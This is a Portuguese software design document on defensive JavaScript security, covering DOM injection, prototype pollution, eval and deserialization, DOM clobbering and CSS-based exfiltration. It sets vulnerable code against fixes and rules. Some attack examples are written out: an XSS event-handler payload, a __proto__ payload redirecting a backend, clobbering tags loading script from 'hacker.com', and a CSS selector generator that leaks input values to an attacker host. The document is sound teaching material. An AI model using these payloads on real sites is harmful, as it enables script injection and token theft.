# SOFTWARE DESIGN DOCUMENT (SDD)

## Segurança JavaScript — Injeção de DOM, Prototype Pollution, Serialização, DOM Clobbering e Exfiltração via CSS

| Campo                | Valor                                                        |
|----------------------|--------------------------------------------------------------|
| **Título**           | Segurança JavaScript: Injeção de DOM, Prototype Pollution, Serialização, DOM Clobbering e Exfiltração via CSS |
| **Versão**           | 1.0                                                          |
| **Data**             | 2026-04-08                                                   |
| **Classificação**    | Confidencial                                                 |
| **Autor**            | Baseado no curso "Segurança Para Devs"                       |

---

## 1. Introdução

### 1.1 Propósito

Este documento descreve o design de segurança para código JavaScript executado no navegador e no servidor (Node.js). Abrange vulnerabilidades críticas que permitem execução de código arbitrário, poluição de protótipos, adulteração de dados, manipulação do DOM sem JavaScript injetado e exfiltração de dados sensíveis através de CSS.

### 1.2 Escopo

- DOM Injection: riscos do uso de `innerHTML`, hierarquia de soluções preventivas
- Prototype Pollution: manipulação de `__proto__` via deep merge, impacto global
- Serialização insegura: `eval()`, `new Function()`, validação de JSON
- DOM Clobbering: sobrescrita de propriedades `document.*` via HTML
- Exfiltração via CSS (CSS Sniffing): vazamento de dados usando seletores de atributo

### 1.3 Definições e Acrônimos

| Termo                | Definição                                                        |
|----------------------|------------------------------------------------------------------|
| **DOM Injection**    | Inserção de HTML/JavaScript malicioso na página via manipulação de DOM |
| **Prototype Pollution**| Sobrescrita de propriedades no protótipo base de objetos JavaScript |
| **Deep Merge**       | Fusão recursiva de objetos que propaga propriedades aninhadas    |
| **DOM Clobbering**   | Técnica de usar elementos HTML para sobrescrever variáveis do `document` |
| **CSS Sniffing**     | Exfiltração de dados usando seletores CSS e requisições de URL   |
| **Safe Sinks**       | APIs DOM que não interpretam HTML (createElement, createTextNode) |
| **DOM Purify**       | Biblioteca de sanitização de HTML que remove código executável   |
| **SRI**              | Sub-Resource Integrity                                            |

### 1.4 Princípio Fundamental

> **O cliente é o território do hacker.** Nunca confie no JavaScript executado no navegador, no HTML renderizado, no CSS aplicado ou em qualquer dado que venha do cliente. Toda lógica de segurança deve ser replicada e validada no servidor.

---

## 2. Visão Geral de Arquitetura

### 2.1 Superfícies de Ataque no JavaScript

```
┌──────────────────────────────────────────────────────────────────────┐
│              SUPERFÍCIES DE ATAQUE — JAVASCRIPT                     │
│                                                                      │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────────┐  │
│  │  DOM INJECTION  │  │   PROTOTYPE      │  │  DOM CLOBBERING     │  │
│  │                 │  │   POLLUTION      │  │                     │  │
│  │  • innerHTML    │  │  • __proto__     │  │  • <img name="x">   │  │
│  │  • on* events   │  │  • Deep Merge    │  │  • <form name="x"> │  │
│  │  • <script>     │  │  • constructor   │  │  • form="id" attr   │  │
│  └────────┬────────┘  └────────┬────────┘  └──────────┬──────────┘  │
│           │                    │                       │              │
│           ▼                    ▼                       ▼              │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────────┐  │
│  │  SERIALIZAÇÃO   │  │  CSS SNIFFING    │  │  IMPACTO GLOBAL     │  │
│  │  INSEGURA       │  │  (EXFILTRAÇÃO)  │  │                     │  │
│  │                 │  │                 │  │  • Exec. código      │  │
│  │  • eval()       │  │  • @import      │  │  • Redir. dados      │  │
│  │  • new Function │  │  • attr selectors│  │  • Vazamento info    │  │
│  │  • JSON.parse ✅│  │  • background:url│  │  • Escal. privilégio │  │
│  └─────────────────┘  └─────────────────┘  └─────────────────────┘  │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 Hierarquia de Prevenção — DOM Injection

```
┌──────────────────────────────────────────────────────┐
│            PRIORIDADE DE PROTEÇÃO                    │
│                                                      │
│  1ª innerText        → Não interpreta HTML (mais     │
│                         seguro, sem superfície de     │
│                         ataque)                       │
│         │                                            │
│         ▼                                            │
│  2ª Safe Sinks       → createElement, createTextNode, │
│                         setAttribute, appendChild    │
│         │                                            │
│         ▼                                            │
│  3ª Template Engine  → Mustache, Handlebars, etc.    │
│         │                                            │
│         ▼                                            │
│  4ª Framework        → Vue.js, React, Angular,       │
│                         Svelte (sanitização built-in) │
│         │                                            │
│         ▼                                            │
│  5ª DOM Purify       → Sanitizador de HTML           │
│                         (último recurso)              │
└──────────────────────────────────────────────────────┘
```

---

## 3. Componentes de Design

### 3.1 Componente: Injeção de DOM (DOM Injection)

#### 3.1.1 Descrição

O uso de `innerHTML` para inserir conteúdo dinâmico na página permite que um atacante injete HTML arbitrário, incluindo event handlers como `onmouseover`, que executam JavaScript no contexto da página.

#### 3.1.2 Código Vulnerável

```javascript
// ❌ VULNERÁVEL — innerHTML com dados do usuário
const output = `<p><b>${carro.modelo}</b> (${carro.ano})</p>`;
results.innerHTML = output;

// Ataque: modelo = '<span onmouseover="alert(\'hack\')">'
// Resultado: passa o mouse no Fusca → executa script
```

#### 3.1.3 Código Seguro

```javascript
// ✅ OPÇÃO 1 — innerText (mais seguro)
results.innerText = `${carro.modelo} (${carro.ano})`;

// ✅ OPÇÃO 2 — Safe Sinks
const p = document.createElement('p');
const b = document.createElement('b');
b.innerText = carro.modelo;
const t = document.createTextNode(` (${carro.ano})`);
p.appendChild(b);
p.appendChild(t);
results.appendChild(p);

// ✅ OPÇÃO 3 — DOM Purify (último recurso)
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
container.innerHTML = cleanHTML;
```

#### 3.1.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| DI-1 | Nunca use `innerHTML` com dados dinâmicos não sanitizados                | Crítica    |
| DI-2 | Prefira `innerText` quando não houver necessidade de HTML na saída       | Alta       |
| DI-3 | Use Safe Sinks: `createElement`, `createTextNode`, `setAttribute`, `appendChild` | Alta       |
| DI-4 | Não escreva seu próprio sanitizador de HTML                              | Alta       |
| DI-5 | Se necessário sanitizar HTML, use DOM Purify                             | Média      |
| DI-6 | Não confie que `&lt;` e `&gt;` resolvem o problema — existem vetores sem essas tags | Alta |

---

### 3.2 Componente: Prototype Pollution

#### 3.2.1 Descrição

A propriedade mágica `__proto__` permite acessar e modificar o protótipo base de todos os objetos JavaScript. Quando combinada com operações de `Deep Merge` em dados provenientes do cliente, um atacante pode injetar propriedades no protótipo global, afetando todos os objetos da aplicação.

#### 3.2.2 Código Vulnerável

```javascript
// ❌ VULNERÁVEL — Deep Merge sem proteção contra __proto__
function deepMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Ataque:
deepMerge(pessoa1, JSON.parse('{"idade":26,"__proto__":{"admin":true}}'));

// Consequência: TODOS os objetos agora têm .admin === true
pessoas[2].admin;       // true
const obj = {};
obj.admin;              // true
```

#### 3.2.3 Código Seguro

```javascript
// ✅ PROTEÇÃO — Filtrar __proto__ no Deep Merge
function deepMerge(target, source) {
    for (const key in source) {
        if (key !== "__proto__") {                        // ← Proteção
            if (typeof source[key] === 'object' && source[key] !== null) {
                if (!target[key]) target[key] = {};
                deepMerge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        } else {
            console.warn('Tentativa de Prototype Pollution detectada');
        }
    }
    return target;
}
```

#### 3.2.4 Cenário de Ataque — Redirecionamento de Backend

```
Atacante:
  deepMerge(config, JSON.parse('{"__proto__":{"backend":"https://sitehacker.com"}}'));

Efeito:
  1. config.backend existe? → Sim (herdado do protótipo)
  2. NÃO lê defaultConfig.backend
  3. Envia dados do usuário para sitehacker.com
  4. Afecta TODAS as requisições do servidor (Node.js) ou cliente
```

#### 3.2.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| PP-1 | Evite `Deep Merge` quando possível — use atribuição direta               | Alta       |
| PP-2 | Filtre `__proto__` e `constructor` em toda operação de merge recursivo   | Crítica    |
| PP-3 | Logue tentativas de Prototype Pollution                                  | Média      |
| PP-4 | Nunca confie em dados do cliente para operações de merge                 | Crítica    |
| PP-5 | Em Node.js: impacto é global no servidor — proteja todas as entradas     | Crítica    |

---

### 3.3 Componente: Serialização e Execução de Código

#### 3.3.1 Descrição

`eval()` e `new Function()` executam strings como código JavaScript. Como JSON é um subset da sintaxe JavaScript, qualquer string JSON pode ser executada por essas funções — mas também qualquer código malicioso. O uso dessas funções com input do usuário permite execução de código arbitrário (RCE).

#### 3.3.2 Código Vulnerável

```javascript
// ❌ CRÍTICO — Nunca use eval()
const data = eval(userInput);  // userInput = '{"__proto__":{"admin":true}}'
                                 // ou qualquer código JavaScript arbitrário

// ❌ CRÍTICO — Nunca use new Function()
const data = (new Function('return ' + userInput))();

// ❌ INSEGURO — Serialização nativa (Python pickle, PHP serialize, etc.)
// Permite serializar MÉTODOS e CLASSES, não apenas dados
```

#### 3.3.3 Código Seguro

```javascript
// ✅ ÚNICA forma correta de parsear JSON
const data = JSON.parse(userInput);

// ✅ Validação de schema (FastAPI/Python)
from pydantic import BaseModel

class Pessoa(BaseModel):
    nome: str
    email: str

@app.post('/pessoa')
async def salva_pessoa(pessoa: Pessoa):
    # Propriedades desconhecidas são IGNORADAS automaticamente
    # Tipos inválidos retornam erro 422
    return pessoa
```

#### 3.3.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| SE-1 | Nunca use `eval()` em produção                                          | Crítica    |
| SE-2 | Nunca use `new Function()` em produção                                   | Crítica    |
| SE-3 | Use `JSON.parse()` como único método de desserialização de JSON          | Crítica    |
| SE-4 | Não escreva seu próprio parser/serializador de JSON                      | Alta       |
| SE-5 | Não use serialização nativa (pickle, PHP serialize) para dados em trânsito | Crítica    |
| SE-6 | Valide sempre o schema/type dos dados recebidos em APIs                  | Alta       |
| SE-7 | Use modelos tipados (Pydantic, TypeScript interfaces, Zod, etc.)         | Alta       |
| SE-8 | Segurança é feita em camadas — valide na entrada para reduzir superfície | Média      |

---

### 3.4 Componente: DOM Clobbering

#### 3.4.1 Descrição

DOM Clobbering explora o comportamento histórico do navegador (herdado do Netscape Navigator) onde elementos HTML com atributo `name` são automaticamente registrados como propriedades do objeto `document`. Um atacante pode injetar HTML que sobrescreve variáveis globais do `document` ou `window`, alterando o comportamento do script sem executar JavaScript diretamente.

#### 3.4.2 Mecanismo de Ataque

```
Código legítimo:
  document.config → espera ler uma string com URL do script

Ataque (HTML puro, sem JavaScript):
  <img name="config" src="http://hacker.com/script.js">

Resultado:
  document.config → agora retorna o elemento <img>
  document.config.src → retorna "http://hacker.com/script.js"

Efeito:
  O script carrega código malicioso do servidor do atacante
  Sem uma única linha de JavaScript injetada
```

#### 3.4.3 Variantes de Ataque

```
┌──────────────────────────────────────────────────────────────────┐
│  VARIANTES DE DOM CLOBBERING                                    │
│                                                                  │
│  1. Simples (1 nível):                                          │
│     <img name="config" src="http://hacker.com/script.js">       │
│     → document.config.src sobrescrito                           │
│                                                                  │
│  2. Hierárquico (múltiplos níveis):                             │
│     <form name="config">                                       │
│       <img name="scriptToLoad" src="http://hacker.com/x.js">   │
│     </form>                                                     │
│     → document.config.scriptToLoad.src sobrescrito              │
│                                                                  │
│  3. Body injection (getElementById):                            │
│     <body><div id="resultado" style="display:none">45</div>     │
│     → document.getElementById("resultado").innerText = "45"     │
│     → Substitui o conteúdo original sem JavaScript              │
│                                                                  │
│  4. Form attribute injection:                                   │
│     <input type="hidden" form="meuForm" name="action"           │
│            value="/api/delete">                                 │
│     → O input, mesmo FORA do form, é submetido com o formulário│
│     → Pode alterar action, method, e outros parâmetros          │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.4.4 Código Vulnerável vs. Seguro

```javascript
// ❌ VULNERÁVEL — Variável global no document
document.config = { scriptToLoad: { src: "meuscript.js" } };
const script = document.createElement("script");
script.src = document.config.scriptToLoad.src;
document.body.appendChild(script);

// ✅ SEGURO — Variável local com const
const config = { scriptToLoad: { src: "meuscript.js" } };
const script = document.createElement("script");
script.src = config.scriptToLoad.src;
document.body.appendChild(script);
```

#### 3.4.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| DC-1 | Nunca use `document.*` ou `window.*` para armazenar variáveis           | Crítica    |
| DC-2 | Sempre use `const` ou `let` com escopo local (módulo/função)            | Alta       |
| DC-3 | Não permita o atributo `id` em HTML injetado pelo usuário               | Alta       |
| DC-4 | Não permita o atributo `form` em inputs injetados pelo usuário          | Alta       |
| DC-5 | Não permita o atributo `name` em elementos injetados (`img`, `form`)    | Média      |
| DC-6 | DOM Purify bloqueia `<body>` mas permite `<img>` com `id` — cuido       | Média      |

---

### 3.5 Componente: Exfiltração via CSS (CSS Sniffing)

#### 3.5.1 Descrição

A injeção de CSS na página permite a um atacante usar seletores de atributo do CSS para testar o valor de campos de formulário e outros elementos, e exfiltrar dados caractere por caractere através de requisições de URL em propriedades como `background`.

#### 3.5.2 Mecanismo de Ataque

```
Passo 1 — Injetar CSS externo:
  @import url("http://hacker.com/inject.php");

Passo 2 — Servidor do atacante gera CSS dinâmico (inject.php):
  for ($i = 0; $i < 10000; $i++) {
      echo "input[value^=\"{$i}\"]{background:url(http://hacker.com/{$i}.png)};";
  }

Passo 3 — O navegador avalia cada seletor:
  • Se o valor do input COMEÇA com "1" → faz requisição para /1.png
  • Se o valor do input COMEÇA com "12" → faz requisição para /12.png
  • Se o valor do input COMEÇA com "123" → faz requisição para /123.png
  • ... e assim sucessivamente

Passo 4 — Logs do servidor do atacante revelam o token completo:
  GET /1.png     → primeiro dígito é "1"
  GET /12.png    → segundo dígito é "2"
  GET /123.png   → terceiro dígito é "3"
  GET /1234.png  → quarto dígito é "4"
  → Token exfiltrado: 1234
```

#### 3.5.3 Seletores CSS Utilizados no Ataque

| Seletor CSS               | Função                                          |
|---------------------------|--------------------------------------------------|
| `[value^="1"]`            | Valor COMEÇA com "1"                            |
| `[value$="4"]`            | Valor TERMINA com "4"                           |
| `[value*="23"]`           | Valor CONTÉM "23"                               |
| `[value="1234"]`          | Valor é exatamente "1234"                       |

#### 3.5.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| CS-1 | Valide CSS de entrada com o mesmo rigor aplicado a HTML e JavaScript     | Crítica    |
| CS-2 | Nunca permita `@import` em CSS injetado                                  | Alta       |
| CS-3 | Nunca permita `url()` em CSS injetado                                    | Alta       |
| CS-4 | Não use `input type="color"` sem validar o valor no servidor             | Média      |
| CS-5 | Não insira nome de tema ou cor do usuário diretamente em CSS             | Média      |

---

## 4. Matriz de Ameaças e Mitigações

| # | Ameaça                        | Vetor de Entrada         | Impacto                          | Mitigação                                      | Componente    |
|---|-------------------------------|--------------------------|----------------------------------|------------------------------------------------|---------------|
| 1 | Execução de código arbitrário | innerHTML + event handler | RCE no navegador do usuário      | innerText / Safe Sinks / DOM Purify             | 3.1           |
| 2 | Prototype Pollution           | `__proto__` via deep merge| Propriedades globais alteradas   | Filtrar `__proto__` no merge                    | 3.2           |
| 3 | Redirecionamento de backend   | `__proto__.backend`      | Dados enviados para servidor malicioso | Filtrar `__proto__` / não usar deep merge    | 3.2           |
| 4 | RCE via eval()                | Input de usuário         | Execução de código arbitrário    | Usar `JSON.parse()`                             | 3.3           |
| 5 | RCE via new Function()        | Input de usuário         | Execução de código arbitrário    | Nunca usar `new Function()`                     | 3.3           |
| 6 | Desserialização insegura      | pickle, PHP serialize    | Instanciação de classes arbitrárias | Usar JSON                                     | 3.3           |
| 7 | Injeção de propriedades       | JSON sem validação de schema| Dados maliciosos persistidos   | Modelos tipados (Pydantic, Zod, etc.)          | 3.3           |
| 8 | Sobrescrita de config         | `<img name="config">`    | Script malicioso carregado       | Escopo local com `const`                        | 3.4           |
| 9 | Submissão de formulário       | `<input form="id">`      | Ação inesperada no formulário    | Não permitir atributo `form`                    | 3.4           |
| 10| Substituição de conteúdo      | `<body>` com `id`        | Conteúdo exibido alterado        | Não permitir `id` em HTML injetado              | 3.4           |
| 11| Exfiltração de tokens         | CSS @import + selectors   | Vazamento de dados sensíveis     | Validar CSS / bloquear `@import` e `url()`      | 3.5           |
| 12| Vazamento de credenciais      | CSS sniffing de inputs    | Login, email, tokens expostos    | Não exibir dados sensíveis em inputs            | 3.5           |

---

## 5. Checklists de Verificação

### 5.1 Checklist Geral — Segurança JavaScript

- [ ] Nenhuma chamada a `eval()` no código-base
- [ ] Nenhuma chamada a `new Function()` no código-base
- [ ] Todo `innerHTML` usa dados estáticos ou dados sanitizados por DOM Purify
- [ ] Preferência por `innerText` quando HTML na saída não é necessário
- [ ] Safe Sinks usados para construção dinâmica de DOM
- [ ] Nenhuma variável armazenada em `document.*` ou `window.*`
- [ ] Todas as variáveis usam `const` ou `let` com escopo local
- [ ] Operações de Deep Merge filtram `__proto__` e `constructor`
- [ ] JSON desserializado exclusivamente com `JSON.parse()`
- [ ] Entradas de API validadas com modelos tipados (Pydantic, Zod, etc.)
- [ ] Propriedades desconhecidas em JSON são rejeitadas/ignoradas
- [ ] Tipos de dados em JSON são validados (string, number, boolean)
- [ ] DOM Purify configurado para bloquear atributos `form`, `id` em elementos injetados
- [ ] CSS de usuário não permite `@import` nem `url()`
- [ ] Valores de cor/tema de usuário são validados no servidor
- [ ] Segredos (API keys, senhas) nunca transmitidos para o cliente
- [ ] Toda lógica de negócio replicada e validada no servidor

### 5.2 Checklist — DOM Clobbering (Revisão de HTML Injetado)

- [ ] Atributo `id` não permitido em HTML injetado pelo usuário
- [ ] Atributo `name` não permitido em `<img>` e `<form>` injetados
- [ ] Atributo `form` não permitido em `<input>` injetados
- [ ] DOM Purify configurado para remover tags `<body>`, `<form>` e `<input>`
- [ ] DOM Purify configurado para remover atributos `id`, `name`, `form`

---

## 6. Tabela Comparativa — Métodos de Inserção no DOM

| Método              | Interpreta HTML? | Seguro? | Quando Usar                              |
|---------------------|------------------|---------|------------------------------------------|
| `innerText`         | Não              | ✅ Sim   | Texto puro, sem necessidade de HTML      |
| `textContent`       | Não              | ✅ Sim   | Texto puro (similar ao innerText)        |
| `createElement`     | N/A              | ✅ Sim   | Construção programática de elementos     |
| `createTextNode`    | N/A              | ✅ Sim   | Inserção de texto sem interpretação      |
| `setAttribute`      | Depende do attr  | ⚠️ Cuidado| Definir atributos específicos           |
| `appendChild`       | N/A              | ✅ Sim   | Adicionar nós criados programaticamente  |
| `innerHTML` (estático) | Sim            | ✅ Sim   | Strings literais sem dados dinâmicos     |
| `innerHTML` (dinâmico) | Sim           | ❌ Não   | Nunca com dados do usuário               |
| `DOMPurify.sanitize` + `innerHTML` | Sim (filtrado) | ⚠️ Parcial | Último recurso, com configuração cuidadosa |
| Template Engine     | Framework-dep.   | ✅ Sim   | Mustache, Handlebars, etc.               |
| Framework (React/Vue/Angular/Svelte) | Framework-dep. | ✅ Sim | Aplicações SPA                           |

---

## 7. Referências

| Recurso                  | URL/Descrição                                         |
|--------------------------|-------------------------------------------------------|
| DOM Purify               | https://github.com/cure53/DOMPurify                  |
| MDN — innerHTML          | https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML |
| MDN — Prototype          | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain |
| OWASP — DOM XSS          | https://owasp.org/www-community/attacks/DOM-based_XSS |
| PortSwigger — DOM Clobbering | https://portswigger.net/web-security/dom-based/dom-clobbering |
| CSS Attribute Selectors  | https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors |
